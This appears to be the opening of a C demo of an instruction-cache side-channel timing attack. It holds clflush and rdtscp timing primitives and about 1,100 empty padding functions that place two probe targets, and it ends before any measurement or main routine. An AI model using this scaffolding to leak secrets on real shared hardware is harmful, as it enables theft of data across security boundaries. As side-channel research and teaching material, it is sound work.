#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

/*
 * Implements a side-channel timing attack via the i-cache.
 * We fetch something into the icache based on a secret being true (1) or false (0)
 */

#define clflush __builtin_ia32_clflush
#define STALL_ITERS 100
#define NUM_POSSIBLE_ANSWERS 2

#define RED  "\x1B[31m"
#define GRN  "\x1B[32m"
#define YLW  "\x1B[33m"
#define DEFAULT  "\x1B[0m"

/*
 * rdtscp (our high-accuracy timer)
 */
static inline __attribute__((always_inline))  uint64_t rdtscp(void)
{
    unsigned int low, high;

    asm volatile("rdtscp" : "=a" (low), "=d" (high) :: "rcx" );

    return low | ((uint64_t)high) << 32; 
}

// Spacing to highlight potential timing difference via i-cache miss
void junk_target(void){return;}
void junk_target0(void){return;}
void junk_target1(void){return;}
void junk_target2(void){return;}
void junk_target3(void){return;}
void junk_target4(void){return;}
void junk_target5(void){return;}
void junk_target6(void){return;}
void junk_target7(void){return;}
void junk_target8(void){return;}
void junk_target9(void){return;}
void junk_target10(void){return;}
void junk_target11(void){return;}
void junk_target12(void){return;}
void junk_target13(void){return;}
void junk_target14(void){return;}
void junk_target15(void){return;}
void junk_target16(void){return;}
void junk_target17(void){return;}
void junk_target18(void){return;}
void junk_target19(void){return;}
void junk_target20(void){return;}
void junk_target21(void){return;}
void junk_target22(void){return;}
void junk_target23(void){return;}
void junk_target24(void){return;}
void junk_target25(void){return;}
void junk_target26(void){return;}
void junk_target27(void){return;}
void junk_target28(void){return;}
void junk_target29(void){return;}
void junk_target30(void){return;}
void junk_target31(void){return;}
void junk_target32(void){return;}
void junk_target33(void){return;}
void junk_target34(void){return;}
void junk_target35(void){return;}
void junk_target36(void){return;}
void junk_target37(void){return;}
void junk_target38(void){return;}
void junk_target39(void){return;}
void junk_target40(void){return;}
void junk_target41(void){return;}
void junk_target42(void){return;}
void junk_target43(void){return;}
void junk_target44(void){return;}
void junk_target45(void){return;}
void junk_target46(void){return;}
void junk_target47(void){return;}
void junk_target48(void){return;}
void junk_target49(void){return;}
void junk_target50(void){return;}
void junk_target51(void){return;}
void junk_target52(void){return;}
void junk_target53(void){return;}
void junk_target54(void){return;}
void junk_target55(void){return;}
void junk_target56(void){return;}
void junk_target57(void){return;}
void junk_target58(void){return;}
void junk_target59(void){return;}
void junk_target60(void){return;}
void junk_target61(void){return;}
void junk_target62(void){return;}
void junk_target63(void){return;}
void junk_target64(void){return;}
void junk_target65(void){return;}
void junk_target66(void){return;}
void junk_target67(void){return;}
void junk_target68(void){return;}
void junk_target69(void){return;}
void junk_target70(void){return;}
void junk_target71(void){return;}
void junk_target72(void){return;}
void junk_target73(void){return;}
void junk_target74(void){return;}
void junk_target75(void){return;}
void junk_target76(void){return;}
void junk_target77(void){return;}
void junk_target78(void){return;}
void junk_target79(void){return;}
void junk_target80(void){return;}
void junk_target81(void){return;}
void junk_target82(void){return;}
void junk_target83(void){return;}
void junk_target84(void){return;}
void junk_target85(void){return;}
void junk_target86(void){return;}
void junk_target87(void){return;}
void junk_target88(void){return;}
void junk_target89(void){return;}
void junk_target90(void){return;}
void junk_target91(void){return;}
void junk_target92(void){return;}
void junk_target93(void){return;}
void junk_target94(void){return;}
void junk_target95(void){return;}
void junk_target96(void){return;}
void junk_target97(void){return;}
void junk_target98(void){return;}
void junk_target99(void){return;}
void junk_target100(void){return;}
void junk_target101(void){return;}
void junk_target102(void){return;}
void junk_target103(void){return;}
void junk_target104(void){return;}
void junk_target105(void){return;}
void junk_target106(void){return;}
void junk_target107(void){return;}
void junk_target108(void){return;}
void junk_target109(void){return;}
void junk_target110(void){return;}
void junk_target111(void){return;}
void junk_target112(void){return;}
void junk_target113(void){return;}
void junk_target114(void){return;}
void junk_target115(void){return;}
void junk_target116(void){return;}
void junk_target117(void){return;}
void junk_target118(void){return;}
void junk_target119(void){return;}
void junk_target120(void){return;}
void junk_target121(void){return;}
void junk_target122(void){return;}
void junk_target123(void){return;}
void junk_target124(void){return;}
void junk_target125(void){return;}
void junk_target126(void){return;}
void junk_target127(void){return;}
void junk_target128(void){return;}
void junk_target129(void){return;}
void junk_target130(void){return;}
void junk_target131(void){return;}
void junk_target132(void){return;}
void junk_target133(void){return;}
void junk_target134(void){return;}
void junk_target135(void){return;}
void junk_target136(void){return;}
void junk_target137(void){return;}
void junk_target138(void){return;}
void junk_target139(void){return;}
void junk_target140(void){return;}
void junk_target141(void){return;}
void junk_target142(void){return;}
void junk_target143(void){return;}
void junk_target144(void){return;}
void junk_target145(void){return;}
void junk_target146(void){return;}
void junk_target147(void){return;}
void junk_target148(void){return;}
void junk_target149(void){return;}
void junk_target150(void){return;}
void junk_target151(void){return;}
void junk_target152(void){return;}
void junk_target153(void){return;}
void junk_target154(void){return;}
void junk_target155(void){return;}
void junk_target156(void){return;}
void junk_target157(void){return;}
void junk_target158(void){return;}
void junk_target159(void){return;}
void junk_target160(void){return;}
void junk_target161(void){return;}
void junk_target162(void){return;}
void junk_target163(void){return;}
void junk_target164(void){return;}
void junk_target165(void){return;}
void junk_target166(void){return;}
void junk_target167(void){return;}
void junk_target168(void){return;}
void junk_target169(void){return;}
void junk_target170(void){return;}
void junk_target171(void){return;}
void junk_target172(void){return;}
void junk_target173(void){return;}
void junk_target174(void){return;}
void junk_target175(void){return;}
void junk_target176(void){return;}
void junk_target177(void){return;}
void junk_target178(void){return;}
void junk_target179(void){return;}
void junk_target180(void){return;}
void junk_target181(void){return;}
void junk_target182(void){return;}
void junk_target183(void){return;}
void junk_target184(void){return;}
void junk_target185(void){return;}
void junk_target186(void){return;}
void junk_target187(void){return;}
void junk_target188(void){return;}
void junk_target189(void){return;}
void junk_target190(void){return;}
void junk_target191(void){return;}
void junk_target192(void){return;}
void junk_target193(void){return;}
void junk_target194(void){return;}
void junk_target195(void){return;}
void junk_target196(void){return;}
void junk_target197(void){return;}
void junk_target198(void){return;}
void junk_target199(void){return;}
void junk_target200(void){return;}
void junk_target201(void){return;}
void junk_target202(void){return;}
void junk_target203(void){return;}
void junk_target204(void){return;}
void junk_target205(void){return;}
void junk_target206(void){return;}
void junk_target207(void){return;}
void junk_target208(void){return;}
void junk_target209(void){return;}
void junk_target210(void){return;}
void junk_target211(void){return;}
void junk_target212(void){return;}
void junk_target213(void){return;}
void junk_target214(void){return;}
void junk_target215(void){return;}
void junk_target216(void){return;}
void junk_target217(void){return;}
void junk_target218(void){return;}
void junk_target219(void){return;}
void junk_target220(void){return;}
void junk_target221(void){return;}
void junk_target222(void){return;}
void junk_target223(void){return;}
void junk_target224(void){return;}
void junk_target225(void){return;}
void junk_target226(void){return;}
void junk_target227(void){return;}
void junk_target228(void){return;}
void junk_target229(void){return;}
void junk_target230(void){return;}
void junk_target231(void){return;}
void junk_target232(void){return;}
void junk_target233(void){return;}
void junk_target234(void){return;}
void junk_target235(void){return;}
void junk_target236(void){return;}
void junk_target237(void){return;}
void junk_target238(void){return;}
void junk_target239(void){return;}
void junk_target240(void){return;}
void junk_target241(void){return;}
void junk_target242(void){return;}
void junk_target243(void){return;}
void junk_target244(void){return;}
void junk_target245(void){return;}
void junk_target246(void){return;}
void junk_target247(void){return;}
void junk_target248(void){return;}
void junk_target249(void){return;}
void junk_target250(void){return;}
void junk_target251(void){return;}
void junk_target252(void){return;}
void junk_target253(void){return;}
void junk_target254(void){return;}
void junk_target255(void){return;}
void junk_target256(void){return;}
void junk_target257(void){return;}
void junk_target258(void){return;}
void junk_target259(void){return;}
void junk_target260(void){return;}
void junk_target261(void){return;}
void junk_target262(void){return;}
void junk_target263(void){return;}
void junk_target264(void){return;}
void junk_target265(void){return;}
void junk_target266(void){return;}
void junk_target267(void){return;}
void junk_target268(void){return;}
void junk_target269(void){return;}
void junk_target270(void){return;}
void junk_target271(void){return;}
void junk_target272(void){return;}
void junk_target273(void){return;}
void junk_target274(void){return;}
void junk_target275(void){return;}
void junk_target276(void){return;}
void junk_target277(void){return;}
void junk_target278(void){return;}
void junk_target279(void){return;}
void junk_target280(void){return;}
void junk_target281(void){return;}
void junk_target282(void){return;}
void junk_target283(void){return;}
void junk_target284(void){return;}
void junk_target285(void){return;}
void junk_target286(void){return;}
void junk_target287(void){return;}
void junk_target288(void){return;}
void junk_target289(void){return;}
void junk_target290(void){return;}
void junk_target291(void){return;}
void junk_target292(void){return;}
void junk_target293(void){return;}
void junk_target294(void){return;}
void junk_target295(void){return;}
void junk_target296(void){return;}
void junk_target297(void){return;}
void junk_target298(void){return;}
void junk_target299(void){return;}
void junk_target300(void){return;}
void junk_target301(void){return;}
void junk_target302(void){return;}
void junk_target303(void){return;}
void junk_target304(void){return;}
void junk_target305(void){return;}
void junk_target306(void){return;}
void junk_target307(void){return;}
void junk_target308(void){return;}
void junk_target309(void){return;}
void junk_target310(void){return;}
void junk_target311(void){return;}
void junk_target312(void){return;}
void junk_target313(void){return;}
void junk_target314(void){return;}
void junk_target315(void){return;}
void junk_target316(void){return;}
void junk_target317(void){return;}
void junk_target318(void){return;}
void junk_target319(void){return;}
void junk_target320(void){return;}
void junk_target321(void){return;}
void junk_target322(void){return;}
void junk_target323(void){return;}
void junk_target324(void){return;}
void junk_target325(void){return;}
void junk_target326(void){return;}
void junk_target327(void){return;}
void junk_target328(void){return;}
void junk_target329(void){return;}
void junk_target330(void){return;}
void junk_target331(void){return;}
void junk_target332(void){return;}
void junk_target333(void){return;}
void junk_target334(void){return;}
void junk_target335(void){return;}
void junk_target336(void){return;}
void junk_target337(void){return;}
void junk_target338(void){return;}
void junk_target339(void){return;}
void junk_target340(void){return;}
void junk_target341(void){return;}
void junk_target342(void){return;}
void junk_target343(void){return;}
void junk_target344(void){return;}
void junk_target345(void){return;}
void junk_target346(void){return;}
void junk_target347(void){return;}
void junk_target348(void){return;}
void junk_target349(void){return;}
void junk_target350(void){return;}
void junk_target351(void){return;}
void junk_target352(void){return;}
void junk_target353(void){return;}
void junk_target354(void){return;}
void junk_target355(void){return;}
void junk_target356(void){return;}
void junk_target357(void){return;}
void junk_target358(void){return;}
void junk_target359(void){return;}
void junk_target360(void){return;}
void junk_target361(void){return;}
void junk_target362(void){return;}
void junk_target363(void){return;}
void junk_target364(void){return;}
void junk_target365(void){return;}
void junk_target366(void){return;}
void junk_target367(void){return;}
void junk_target368(void){return;}
void junk_target369(void){return;}
void junk_target370(void){return;}
void junk_target371(void){return;}
void junk_target372(void){return;}
void junk_target373(void){return;}
void junk_target374(void){return;}
void junk_target375(void){return;}
void junk_target376(void){return;}
void junk_target377(void){return;}
void junk_target378(void){return;}
void junk_target379(void){return;}
void junk_target380(void){return;}
void junk_target381(void){return;}
void junk_target382(void){return;}
void junk_target383(void){return;}
void junk_target384(void){return;}
void junk_target385(void){return;}
void junk_target386(void){return;}
void junk_target387(void){return;}
void junk_target388(void){return;}
void junk_target389(void){return;}
void junk_target390(void){return;}
void junk_target391(void){return;}
void junk_target392(void){return;}
void junk_target393(void){return;}
void junk_target394(void){return;}
void junk_target395(void){return;}
void junk_target396(void){return;}
void junk_target397(void){return;}
void junk_target398(void){return;}
void junk_target399(void){return;}
void junk_target400(void){return;}
void junk_target401(void){return;}
void junk_target402(void){return;}
void junk_target403(void){return;}
void junk_target404(void){return;}
void junk_target405(void){return;}
void junk_target406(void){return;}
void junk_target407(void){return;}
void junk_target408(void){return;}
void junk_target409(void){return;}
void junk_target410(void){return;}
void junk_target411(void){return;}
void junk_target412(void){return;}
void junk_target413(void){return;}
void junk_target414(void){return;}
void junk_target415(void){return;}
void junk_target416(void){return;}
void junk_target417(void){return;}
void junk_target418(void){return;}
void junk_target419(void){return;}
void junk_target420(void){return;}
void junk_target421(void){return;}
void junk_target422(void){return;}
void junk_target423(void){return;}
void junk_target424(void){return;}
void junk_target425(void){return;}
void junk_target426(void){return;}
void junk_target427(void){return;}
void junk_target428(void){return;}
void junk_target429(void){return;}
void junk_target430(void){return;}
void junk_target431(void){return;}
void junk_target432(void){return;}
void junk_target433(void){return;}
void junk_target434(void){return;}
void junk_target435(void){return;}
void junk_target436(void){return;}
void junk_target437(void){return;}
void junk_target438(void){return;}
void junk_target439(void){return;}
void junk_target440(void){return;}
void junk_target441(void){return;}
void junk_target442(void){return;}
void junk_target443(void){return;}
void junk_target444(void){return;}
void junk_target445(void){return;}
void junk_target446(void){return;}
void junk_target447(void){return;}
void junk_target448(void){return;}
void junk_target449(void){return;}
void junk_target450(void){return;}
void junk_target451(void){return;}
void junk_target452(void){return;}
void junk_target453(void){return;}
void junk_target454(void){return;}
void junk_target455(void){return;}
void junk_target456(void){return;}
void junk_target457(void){return;}
void junk_target458(void){return;}
void junk_target459(void){return;}
void junk_target460(void){return;}
void junk_target461(void){return;}
void junk_target462(void){return;}
void junk_target463(void){return;}
void junk_target464(void){return;}
void junk_target465(void){return;}
void junk_target466(void){return;}
void junk_target467(void){return;}
void junk_target468(void){return;}
void junk_target469(void){return;}
void junk_target470(void){return;}
void junk_target471(void){return;}
void junk_target472(void){return;}
void junk_target473(void){return;}
void junk_target474(void){return;}
void junk_target475(void){return;}
void junk_target476(void){return;}
void junk_target477(void){return;}
void junk_target478(void){return;}
void junk_target479(void){return;}
void junk_target480(void){return;}
void junk_target481(void){return;}
void junk_target482(void){return;}
void junk_target483(void){return;}
void junk_target484(void){return;}
void junk_target485(void){return;}
void junk_target486(void){return;}
void junk_target487(void){return;}
void junk_target488(void){return;}
void junk_target489(void){return;}
void junk_target490(void){return;}
void junk_target491(void){return;}
void junk_target492(void){return;}
void junk_target493(void){return;}
void junk_target494(void){return;}
void junk_target495(void){return;}
void junk_target496(void){return;}
void junk_target497(void){return;}
void junk_target498(void){return;}
void junk_target499(void){return;}
void junk_target500(void){return;}
void junk_target501(void){return;}
void junk_target502(void){return;}
void junk_target503(void){return;}
void junk_target504(void){return;}
void junk_target505(void){return;}
void junk_target506(void){return;}
void junk_target507(void){return;}
void junk_target508(void){return;}
void junk_target509(void){return;}
void junk_target510(void){return;}
void target0(void){return;}
void junk_target512(void){return;}
void junk_target513(void){return;}
void junk_target514(void){return;}
void junk_target515(void){return;}
void junk_target516(void){return;}
void junk_target517(void){return;}
void junk_target518(void){return;}
void junk_target519(void){return;}
void junk_target520(void){return;}
void junk_target521(void){return;}
void junk_target522(void){return;}
void junk_target523(void){return;}
void junk_target524(void){return;}
void junk_target525(void){return;}
void junk_target526(void){return;}
void junk_target527(void){return;}
void junk_target528(void){return;}
void junk_target529(void){return;}
void junk_target530(void){return;}
void junk_target531(void){return;}
void junk_target532(void){return;}
void junk_target533(void){return;}
void junk_target534(void){return;}
void junk_target535(void){return;}
void junk_target536(void){return;}
void junk_target537(void){return;}
void junk_target538(void){return;}
void junk_target539(void){return;}
void junk_target540(void){return;}
void junk_target541(void){return;}
void junk_target542(void){return;}
void junk_target543(void){return;}
void junk_target544(void){return;}
void junk_target545(void){return;}
void junk_target546(void){return;}
void junk_target547(void){return;}
void junk_target548(void){return;}
void junk_target549(void){return;}
void junk_target550(void){return;}
void junk_target551(void){return;}
void junk_target552(void){return;}
void junk_target553(void){return;}
void junk_target554(void){return;}
void junk_target555(void){return;}
void junk_target556(void){return;}
void junk_target557(void){return;}
void junk_target558(void){return;}
void junk_target559(void){return;}
void junk_target560(void){return;}
void junk_target561(void){return;}
void junk_target562(void){return;}
void junk_target563(void){return;}
void junk_target564(void){return;}
void junk_target565(void){return;}
void junk_target566(void){return;}
void junk_target567(void){return;}
void junk_target568(void){return;}
void junk_target569(void){return;}
void junk_target570(void){return;}
void junk_target571(void){return;}
void junk_target572(void){return;}
void junk_target573(void){return;}
void junk_target574(void){return;}
void junk_target575(void){return;}
void junk_target576(void){return;}
void junk_target577(void){return;}
void junk_target578(void){return;}
void junk_target579(void){return;}
void junk_target580(void){return;}
void junk_target581(void){return;}
void junk_target582(void){return;}
void junk_target583(void){return;}
void junk_target584(void){return;}
void junk_target585(void){return;}
void junk_target586(void){return;}
void junk_target587(void){return;}
void junk_target588(void){return;}
void junk_target589(void){return;}
void junk_target590(void){return;}
void junk_target591(void){return;}
void junk_target592(void){return;}
void junk_target593(void){return;}
void junk_target594(void){return;}
void junk_target595(void){return;}
void junk_target596(void){return;}
void junk_target597(void){return;}
void junk_target598(void){return;}
void junk_target599(void){return;}
void junk_target600(void){return;}
void junk_target601(void){return;}
void junk_target602(void){return;}
void junk_target603(void){return;}
void junk_target604(void){return;}
void junk_target605(void){return;}
void junk_target606(void){return;}
void junk_target607(void){return;}
void junk_target608(void){return;}
void junk_target609(void){return;}
void junk_target610(void){return;}
void junk_target611(void){return;}
void junk_target612(void){return;}
void junk_target613(void){return;}
void junk_target614(void){return;}
void junk_target615(void){return;}
void junk_target616(void){return;}
void junk_target617(void){return;}
void junk_target618(void){return;}
void junk_target619(void){return;}
void junk_target620(void){return;}
void junk_target621(void){return;}
void junk_target622(void){return;}
void junk_target623(void){return;}
void junk_target624(void){return;}
void junk_target625(void){return;}
void junk_target626(void){return;}
void junk_target627(void){return;}
void junk_target628(void){return;}
void junk_target629(void){return;}
void junk_target630(void){return;}
void junk_target631(void){return;}
void junk_target632(void){return;}
void junk_target633(void){return;}
void junk_target634(void){return;}
void junk_target635(void){return;}
void junk_target636(void){return;}
void junk_target637(void){return;}
void junk_target638(void){return;}
void junk_target639(void){return;}
void junk_target640(void){return;}
void junk_target641(void){return;}
void junk_target642(void){return;}
void junk_target643(void){return;}
void junk_target644(void){return;}
void junk_target645(void){return;}
void junk_target646(void){return;}
void junk_target647(void){return;}
void junk_target648(void){return;}
void junk_target649(void){return;}
void junk_target650(void){return;}
void junk_target651(void){return;}
void junk_target652(void){return;}
void junk_target653(void){return;}
void junk_target654(void){return;}
void junk_target655(void){return;}
void junk_target656(void){return;}
void junk_target657(void){return;}
void junk_target658(void){return;}
void junk_target659(void){return;}
void junk_target660(void){return;}
void junk_target661(void){return;}
void junk_target662(void){return;}
void junk_target663(void){return;}
void junk_target664(void){return;}
void junk_target665(void){return;}
void junk_target666(void){return;}
void junk_target667(void){return;}
void junk_target668(void){return;}
void junk_target669(void){return;}
void junk_target670(void){return;}
void junk_target671(void){return;}
void junk_target672(void){return;}
void junk_target673(void){return;}
void junk_target674(void){return;}
void junk_target675(void){return;}
void junk_target676(void){return;}
void junk_target677(void){return;}
void junk_target678(void){return;}
void junk_target679(void){return;}
void junk_target680(void){return;}
void junk_target681(void){return;}
void junk_target682(void){return;}
void junk_target683(void){return;}
void junk_target684(void){return;}
void junk_target685(void){return;}
void junk_target686(void){return;}
void junk_target687(void){return;}
void junk_target688(void){return;}
void junk_target689(void){return;}
void junk_target690(void){return;}
void junk_target691(void){return;}
void junk_target692(void){return;}
void junk_target693(void){return;}
void junk_target694(void){return;}
void junk_target695(void){return;}
void junk_target696(void){return;}
void junk_target697(void){return;}
void junk_target698(void){return;}
void junk_target699(void){return;}
void junk_target700(void){return;}
void junk_target701(void){return;}
void junk_target702(void){return;}
void junk_target703(void){return;}
void junk_target704(void){return;}
void junk_target705(void){return;}
void junk_target706(void){return;}
void junk_target707(void){return;}
void junk_target708(void){return;}
void junk_target709(void){return;}
void junk_target710(void){return;}
void junk_target711(void){return;}
void junk_target712(void){return;}
void junk_target713(void){return;}
void junk_target714(void){return;}
void junk_target715(void){return;}
void junk_target716(void){return;}
void junk_target717(void){return;}
void junk_target718(void){return;}
void junk_target719(void){return;}
void junk_target720(void){return;}
void junk_target721(void){return;}
void junk_target722(void){return;}
void junk_target723(void){return;}
void junk_target724(void){return;}
void junk_target725(void){return;}
void junk_target726(void){return;}
void junk_target727(void){return;}
void junk_target728(void){return;}
void junk_target729(void){return;}
void junk_target730(void){return;}
void junk_target731(void){return;}
void junk_target732(void){return;}
void junk_target733(void){return;}
void junk_target734(void){return;}
void junk_target735(void){return;}
void junk_target736(void){return;}
void junk_target737(void){return;}
void junk_target738(void){return;}
void junk_target739(void){return;}
void junk_target740(void){return;}
void junk_target741(void){return;}
void junk_target742(void){return;}
void junk_target743(void){return;}
void junk_target744(void){return;}
void junk_target745(void){return;}
void junk_target746(void){return;}
void junk_target747(void){return;}
void junk_target748(void){return;}
void junk_target749(void){return;}
void junk_target750(void){return;}
void junk_target751(void){return;}
void junk_target752(void){return;}
void junk_target753(void){return;}
void junk_target754(void){return;}
void junk_target755(void){return;}
void junk_target756(void){return;}
void junk_target757(void){return;}
void junk_target758(void){return;}
void junk_target759(void){return;}
void junk_target760(void){return;}
void junk_target761(void){return;}
void junk_target762(void){return;}
void junk_target763(void){return;}
void junk_target764(void){return;}
void junk_target765(void){return;}
void junk_target766(void){return;}
void junk_target767(void){return;}
void junk_target768(void){return;}
void junk_target769(void){return;}
void junk_target770(void){return;}
void junk_target771(void){return;}
void junk_target772(void){return;}
void junk_target773(void){return;}
void junk_target774(void){return;}
void junk_target775(void){return;}
void junk_target776(void){return;}
void junk_target777(void){return;}
void junk_target778(void){return;}
void junk_target779(void){return;}
void junk_target780(void){return;}
void junk_target781(void){return;}
void junk_target782(void){return;}
void junk_target783(void){return;}
void junk_target784(void){return;}
void junk_target785(void){return;}
void junk_target786(void){return;}
void junk_target787(void){return;}
void junk_target788(void){return;}
void junk_target789(void){return;}
void junk_target790(void){return;}
void junk_target791(void){return;}
void junk_target792(void){return;}
void junk_target793(void){return;}
void junk_target794(void){return;}
void junk_target795(void){return;}
void junk_target796(void){return;}
void junk_target797(void){return;}
void junk_target798(void){return;}
void junk_target799(void){return;}
void junk_target800(void){return;}
void junk_target801(void){return;}
void junk_target802(void){return;}
void junk_target803(void){return;}
void junk_target804(void){return;}
void junk_target805(void){return;}
void junk_target806(void){return;}
void junk_target807(void){return;}
void junk_target808(void){return;}
void junk_target809(void){return;}
void junk_target810(void){return;}
void junk_target811(void){return;}
void junk_target812(void){return;}
void junk_target813(void){return;}
void junk_target814(void){return;}
void junk_target815(void){return;}
void junk_target816(void){return;}
void junk_target817(void){return;}
void junk_target818(void){return;}
void junk_target819(void){return;}
void junk_target820(void){return;}
void junk_target821(void){return;}
void junk_target822(void){return;}
void junk_target823(void){return;}
void junk_target824(void){return;}
void junk_target825(void){return;}
void junk_target826(void){return;}
void junk_target827(void){return;}
void junk_target828(void){return;}
void junk_target829(void){return;}
void junk_target830(void){return;}
void junk_target831(void){return;}
void junk_target832(void){return;}
void junk_target833(void){return;}
void junk_target834(void){return;}
void junk_target835(void){return;}
void junk_target836(void){return;}
void junk_target837(void){return;}
void junk_target838(void){return;}
void junk_target839(void){return;}
void junk_target840(void){return;}
void junk_target841(void){return;}
void junk_target842(void){return;}
void junk_target843(void){return;}
void junk_target844(void){return;}
void junk_target845(void){return;}
void junk_target846(void){return;}
void junk_target847(void){return;}
void junk_target848(void){return;}
void junk_target849(void){return;}
void junk_target850(void){return;}
void junk_target851(void){return;}
void junk_target852(void){return;}
void junk_target853(void){return;}
void junk_target854(void){return;}
void junk_target855(void){return;}
void junk_target856(void){return;}
void junk_target857(void){return;}
void junk_target858(void){return;}
void junk_target859(void){return;}
void junk_target860(void){return;}
void junk_target861(void){return;}
void junk_target862(void){return;}
void junk_target863(void){return;}
void junk_target864(void){return;}
void junk_target865(void){return;}
void junk_target866(void){return;}
void junk_target867(void){return;}
void junk_target868(void){return;}
void junk_target869(void){return;}
void junk_target870(void){return;}
void junk_target871(void){return;}
void junk_target872(void){return;}
void junk_target873(void){return;}
void junk_target874(void){return;}
void junk_target875(void){return;}
void junk_target876(void){return;}
void junk_target877(void){return;}
void junk_target878(void){return;}
void junk_target879(void){return;}
void junk_target880(void){return;}
void junk_target881(void){return;}
void junk_target882(void){return;}
void junk_target883(void){return;}
void junk_target884(void){return;}
void junk_target885(void){return;}
void junk_target886(void){return;}
void junk_target887(void){return;}
void junk_target888(void){return;}
void junk_target889(void){return;}
void junk_target890(void){return;}
void junk_target891(void){return;}
void junk_target892(void){return;}
void junk_target893(void){return;}
void junk_target894(void){return;}
void junk_target895(void){return;}
void junk_target896(void){return;}
void junk_target897(void){return;}
void junk_target898(void){return;}
void junk_target899(void){return;}
void junk_target900(void){return;}
void junk_target901(void){return;}
void junk_target902(void){return;}
void junk_target903(void){return;}
void junk_target904(void){return;}
void junk_target905(void){return;}
void junk_target906(void){return;}
void junk_target907(void){return;}
void junk_target908(void){return;}
void junk_target909(void){return;}
void junk_target910(void){return;}
void junk_target911(void){return;}
void junk_target912(void){return;}
void junk_target913(void){return;}
void junk_target914(void){return;}
void junk_target915(void){return;}
void junk_target916(void){return;}
void junk_target917(void){return;}
void junk_target918(void){return;}
void junk_target919(void){return;}
void junk_target920(void){return;}
void junk_target921(void){return;}
void junk_target922(void){return;}
void junk_target923(void){return;}
void junk_target924(void){return;}
void junk_target925(void){return;}
void junk_target926(void){return;}
void junk_target927(void){return;}
void junk_target928(void){return;}
void junk_target929(void){return;}
void junk_target930(void){return;}
void junk_target931(void){return;}
void junk_target932(void){return;}
void junk_target933(void){return;}
void junk_target934(void){return;}
void junk_target935(void){return;}
void junk_target936(void){return;}
void junk_target937(void){return;}
void junk_target938(void){return;}
void junk_target939(void){return;}
void junk_target940(void){return;}
void junk_target941(void){return;}
void junk_target942(void){return;}
void junk_target943(void){return;}
void junk_target944(void){return;}
void junk_target945(void){return;}
void junk_target946(void){return;}
void junk_target947(void){return;}
void junk_target948(void){return;}
void junk_target949(void){return;}
void junk_target950(void){return;}
void junk_target951(void){return;}
void junk_target952(void){return;}
void junk_target953(void){return;}
void junk_target954(void){return;}
void junk_target955(void){return;}
void junk_target956(void){return;}
void junk_target957(void){return;}
void junk_target958(void){return;}
void junk_target959(void){return;}
void junk_target960(void){return;}
void junk_target961(void){return;}
void junk_target962(void){return;}
void junk_target963(void){return;}
void junk_target964(void){return;}
void junk_target965(void){return;}
void junk_target966(void){return;}
void junk_target967(void){return;}
void junk_target968(void){return;}
void junk_target969(void){return;}
void junk_target970(void){return;}
void junk_target971(void){return;}
void junk_target972(void){return;}
void junk_target973(void){return;}
void junk_target974(void){return;}
void junk_target975(void){return;}
void junk_target976(void){return;}
void junk_target977(void){return;}
void junk_target978(void){return;}
void junk_target979(void){return;}
void junk_target980(void){return;}
void junk_target981(void){return;}
void junk_target982(void){return;}
void junk_target983(void){return;}
void junk_target984(void){return;}
void junk_target985(void){return;}
void junk_target986(void){return;}
void junk_target987(void){return;}
void junk_target988(void){return;}
void junk_target989(void){return;}
void junk_target990(void){return;}
void junk_target991(void){return;}
void junk_target992(void){return;}
void junk_target993(void){return;}
void junk_target994(void){return;}
void junk_target995(void){return;}
void junk_target996(void){return;}
void junk_target997(void){return;}
void junk_target998(void){return;}
void junk_target999(void){return;}
void junk_target1000(void){return;}
void junk_target1001(void){return;}
void junk_target1002(void){return;}
void junk_target1003(void){return;}
void junk_target1004(void){return;}
void junk_target1005(void){return;}
void junk_target1006(void){return;}
void junk_target1007(void){return;}
void junk_target1008(void){return;}
void junk_target1009(void){return;}
void junk_target1010(void){return;}
void junk_target1011(void){return;}
void junk_target1012(void){return;}
void junk_target1013(void){return;}
void junk_target1014(void){return;}
void junk_target1015(void){return;}
void junk_target1016(void){return;}
void junk_target1017(void){return;}
void junk_target1018(void){return;}
void junk_target1019(void){return;}
void junk_target1020(void){return;}
void junk_target1021(void){return;}
void junk_target1022(void){return;}
void target1(void){return;}
void junk_target1024(void){return;}
void junk_target1025(void){return;}
void junk_target1026(void){return;}
void junk_target1027(void){return;}
void junk_target1028(void){return;}
void junk_target1029(void){return;}
void junk_target1030(void){return;}
void junk_target1031(void){return;}
void junk_target1032(void){return;}
void junk_target1033(void){return;}
void junk_target1034(void){return;}
void junk_target1035(void){return;}
void junk_target1036(void){return;}
void junk_target1037(void){return;}
void junk_target1038(void){return;}
void junk_target1039(void){return;}
void junk_target1040(void){return;}
void junk_target1041(void){return;}
void junk_target1042(void){return;}
void junk_target1043(void){return;}
void junk_target1044(void){return;}
void junk_target1045(void){return;}
void junk_target1046(void){return;}
void junk_target1047(void){return;}
void junk_target1048(void){return;}
void junk_target1049(void){return;}
void junk_target1050(void){return;}
void junk_target1051(void){return;}
void junk_target1052(void){return;}
void junk_target1053(void){return;}
void junk_target1054(void){return;}
void junk_target1055(void){return;}
void junk_target1056(void){return;}
void junk_target1057(void){return;}
void junk_target1058(void){return;}
void junk_target1059(void){return;}
void junk_target1060(void){return;}
void junk_target1061(void){return;}
void junk_target1062(void){return;}
void junk_target1063(void){return;}
void junk_target1064(void){return;}
void junk_target1065(void){return;}
void junk_target1066(void){return;}
void junk_target1067(void){return;}
void junk_target1068(void){return;}
void junk_target1069(void){return;}
void junk_target1070(void){return;}
void junk_target1071(void){return;}
void junk_target1072(void){return;}
void junk_target1073(void){return;}
void junk_target1074(void){return;}
void junk_target1075(void){return;}
void junk_target1076(void){return;}
void junk_target1077(void){return;}
void junk_target1078(void){return;}
void junk_target1079(void){return;}
void junk_target1080(void){return;}
void junk_target1081(void){return;}
void junk_target1082(void){return;}
void junk_target1083(void){return;}
void junk_target1084(void){return;}
void junk_target1085(void){return;}
void junk_target1086(void){return;}
void junk_target1087(void){return;}
void junk_target1088(void){return;}
void junk_target1089(void){return;}
void junk_target1090(void){return;}
void junk_target1091(void){return;}
void junk_target1092(void){return;}
void junk_target1093(void){return;}
void junk_target1094(void){return;}
void junk_target1095(void){return;}
void junk_target1096(void){return;}
void junk_target1097(void){return;}
void junk_target1098(void){return;}
void junk_target1099(void){return;}
void junk_target1100(void){return;}
void junk_target1101(void){return;}
void junk_target1102(void){return;}
void junk_target1103(void){return;}
void junk_target1104(void){return;}
void junk_target1105(void){return;}
void junk_target1106(void){return;}
void junk_target1107(void){return;}
void junk_target1108(void){return;}
void junk_target1109(void){return;}
void junk_target1110(void){return;}
void junk_target1111(void){return;}
void junk_target1112(void){return;}
void junk_target1113(void){return;}
void junk_target1114(void){return;}
void junk_target1115(void){return;}
